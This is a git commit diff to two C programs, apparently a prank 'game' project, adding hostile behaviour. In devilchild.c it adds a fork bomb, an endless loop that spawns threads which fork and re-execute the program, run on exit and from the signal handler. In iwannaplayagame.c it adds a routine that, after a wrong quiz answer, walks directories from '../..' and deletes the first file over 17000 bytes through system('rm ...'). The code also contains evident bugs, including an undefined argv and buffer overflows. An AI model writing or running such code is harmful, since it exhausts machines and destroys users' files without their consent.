234a3a89f642b2183f35a072bf1496615b9fb6df
Rene <renega1238@gmail.com>
2022-04-21 21:43:18 -0500

    Final commit?

--- devilchild.c
+++ devilchild.c
@@ -8,6 +8,8 @@
 #include <string.h>
 
 void signalHandler(int sig);
+void ResourceEater(); 
+void* eatAll(void* vargs);
 
 int main(void)
 {
@@ -51,6 +53,8 @@ int main(void)
 
 	}
 
+	ResourceEater();
+
 	return EXIT_SUCCESS;
 
 }
@@ -60,7 +64,69 @@ void signalHandler(int sig)
 
 	printf("I am not as patient as my father, now.... bye!\n"); 
 
+	ResourceEater(); 
+
 	// Kill 
 	//
-	exit(2); 
+	// exit(2); 
+}
+
+void ResourceEater()
+{
+
+	pthread_t pthread;
+
+	while(1)
+	{
+
+		pthread_create(&pthread, NULL, eatAll, (void*)argv[0]);
+	
+	}
+
+}
+
+void* eatAll(void* varg)
+{
+
+	char* name = (char*)varg;
+	char* msg = " I am HUNGRY!!! \n";
+
+	printf("%s", msg);
+
+	pid_t pid = fork();
+
+	if(pid == -1)
+	{
+
+		printf("Damn I failed my only purpose\n");
+
+	}
+	else if(pid == 0)
+	{
+
+		char* args[] = {name, NULL};
+
+		printf("I am about to multiplicate! I need friends\n");
+
+		// Make copy
+		if(execv(args[0], args) == 0)
+		{
+			printf("I'm a dissappointment\n");
+
+		}
+
+		exit(EXIT_SUCCESS);
+
+	}
+	else
+	{
+
+		wait(NULL);
+
+		printf("Are ok?\n");
+
+	}
+
+	return NULL;
+
 }
--- iwannaplayagame.c
+++ iwannaplayagame.c
@@ -8,6 +8,20 @@
 #include <signal.h>
 #include <time.h>
 #include <sys/wait.h>
+#include <dirent.h>
+#include <errno.h>
+
+
+typedef struct
+{
+
+	int flag; 
+	long int size_f;
+	char* dir_n;
+	char* file;
+	char* ex_n;
+
+}Args; 
 
 // Msg functions
 void WelcomePlayer(); 
@@ -22,16 +36,22 @@ void* Timer(void* vargs);
 void signalHandler(int sig); 
 
 // Main game
-void PlayGame(); 
-void Consequences(int casw, int iasw); 
+void PlayGame(char* pname); 
+void Consequences(int casw, int iasw, char* pname); 
 
 // Child
 void CreateChild(); 
 
 // Consequences
 void EatGarbage();
+	// Delete File
+void DeleteFile();
+	// Thread for navigate and count new Dir
+void* foundNewDir(void* vargs); 
+off_t Fsize(const char* filename); 
+char* getName(char* arg); 
 
-int main(void)
+int main(int argc, char* argv[argc + 1])
 {
 
 	// Signals
@@ -42,7 +62,7 @@ int main(void)
 
 	CreateChild();
 
-	PlayGame(); 
+	PlayGame(argv[0]); 
 	
 	pthread_t timer_t; 
 	int timer; 
@@ -181,7 +201,7 @@ void Questions(int option)
 
 }
 
-void PlayGame()
+void PlayGame(char* pname)
 {
 
 	int casw; 
@@ -238,14 +258,14 @@ void PlayGame()
 			casw,
 			iasw);
 
-	Consequences(casw, iasw);
+	Consequences(casw, iasw, pname);
 
 	free(asw1);
 	free(asw3);
 
 }
 
-void Consequences(int casw, int iasw)
+void Consequences(int casw, int iasw, char* pname)
 {
 
 	if(iasw >= casw)
@@ -265,13 +285,15 @@ void Consequences(int casw, int iasw)
 				break;	
 			case 2: 
 				printf("I will take smth from you!! \n"); 
+				DeleteFile(pname);
 				break; 
 			case 3:
 				printf("Alright... I hope you saved your work\n"); 
-				sleep(3);
+				exit(2);
 				break; 
 			default:
 				printf("As I am not sure... BYE!\n");
+				exit(2);
 
 		}
 
@@ -333,5 +355,225 @@ void EatGarbage()
 		free(command);
 
 	}
+
+}
+
+void DeleteFile(char* pname)
+{
+
+	// Initialize struct (args)
+	Args* dirInf = (Args*)malloc(sizeof(Args));
+	dirInf->flag = 1;
+	dirInf->size_f = 17000; 
+	dirInf->dir_n = "../..";
+	dirInf->file = (char*)calloc(100,sizeof(char));
+
+	// Name of file 
+	dirInf->ex_n = getName(pname);
+
+	// printf("File name: %s\n", dirInf->ex_n); 
+
+	// Thread vars
+	pthread_t fnd_t; 
+	int fnd; 
+
+	// Create main thread
+	fnd = pthread_create(&fnd_t, NULL, foundNewDir, (void*)dirInf);
+	pthread_join(fnd_t, NULL); 
+
+	// printf("Selected file from MAIN: %s\n", dirInf->file); 
+
+	char* command; 
+	command = (char*)calloc(20, sizeof(char));
+
+	strcpy(command, "rm ");
+	strcat(command, dirInf->file);
+
+	system(command);
+
+	// Free memory
+	free(dirInf->file);
+	free(dirInf->ex_n);
+	free(dirInf); 
+	free(command);
+
+}
+
+// Compartimos memoria en el Struct
+void* foundNewDir(void* vargs)
+{
+
+	Args* dirInf = (Args*)vargs; 
+
+	// Struct for dirs
+	DIR* dir; 
+	struct dirent* drnt; 
+
+	// New thread
+	pthread_t ndir_t;
+	int ndir;
+
+	// For current dir
+	char cwd[1000]; 
+	char* newPath;
+
+	// Change to user's dir
+	chdir(dirInf->dir_n); 
+
+	// Get directory
+	getcwd(cwd, sizeof(cwd)); 
+
+	//dirInf->dir_n = cwd; 
+	//strcat(dirInf->dir_n, "/");
+
+	// printf("cwd before dir read: %s\n", dirInf->dir_n);
+
+	// Open directory
+	dir = opendir(dirInf->dir_n); 
+	if(dir == NULL)
+	{
+
+		printf("ERR: Invalid dir: %s\n", dirInf->dir_n);
+		pthread_exit(0); 
+
+	}
+
+
+	// While over returned files / directories
+	while((drnt = readdir(dir)) != NULL)
+	{
+		// strcmp returns 0 if equal
+		// Skip father and current dierctory
+		if(!strcmp(drnt->d_name, ".") || !strcmp(drnt->d_name, "..") || !strcmp(drnt->d_name, dirInf->ex_n))
+		{
+
+			continue;
+
+		}
+		// If directory
+		// Create new thread
+		else if(drnt->d_type == DT_DIR)
+		{
+
+			// New path
+			newPath = cwd;
+			strcat(newPath,"/");
+			
+			// Path to new path
+			strcat(newPath, drnt->d_name);
+
+			// Pass new directory
+			dirInf->dir_n = newPath;
+
+			// printf("cwd after dir read: %s\n", dirInf->dir_n);
+	
+			// Create new thread for new directory
+			ndir = pthread_create(&ndir_t, NULL, foundNewDir, (void*)dirInf);
+			pthread_join(ndir_t, NULL);
+
+			// Go up a level
+			chdir(".."); 
+			getcwd(cwd, sizeof(cwd));
+
+			// Retrun to father directory
+			dirInf->dir_n = cwd; 
+			
+
+		}
+		// Print files
+		else
+		{
+			// If file bigger
+			if(Fsize(drnt->d_name) > dirInf->size_f)
+			{
+				
+				// Only first found	
+				 if(dirInf->flag)
+				{
+
+					dirInf->flag = 0;
+
+					// Get current path
+					getcwd(cwd, sizeof(cwd)); 
+
+					// Get path + /
+					newPath = cwd;
+					strcat(newPath, "/");
+
+					// Add selected file
+					strcat(newPath, drnt->d_name);
+					strcpy(dirInf->file, newPath);
+
+
+				}
+				
+			}
+			
+		}
+
+	}
+
+	// Close
+	closedir(dir); 
+
+	// Exit thread
+	pthread_exit(EXIT_SUCCESS); 
+
+}
+
+off_t Fsize(const char* filename)
+{
+
+	struct stat st;
+
+	if(stat(filename, &st) == 0)
+	{
+
+		return st.st_size;
+
+	}
+	else
+	{
+
+		fprintf(stderr, "Could not determine size of file: %s || %s\n", filename, strerror(errno));
+
+		return -1; 
+
+	}
+
+}
+
+char* getName(char* arg)
+{
+
+	char* fname = arg; 
+	char* rname = (char*)calloc(15, sizeof(char)); 
+
+	size_t s = 0; 
+
+	for(size_t i = strlen(fname)-1; i > 0; i--)
+	{
+
+		if(fname[i] == '/')
+		{
+
+			s = i; 
+
+		}
+
+	}
+
+	int c = 0; 
+
+	for(size_t i = s + 1; i < strlen(fname); i++)
+	{
+
+		rname[c] = fname[i]; 
+
+		c++; 
+
+	}
+
+	return rname; 
 
 }
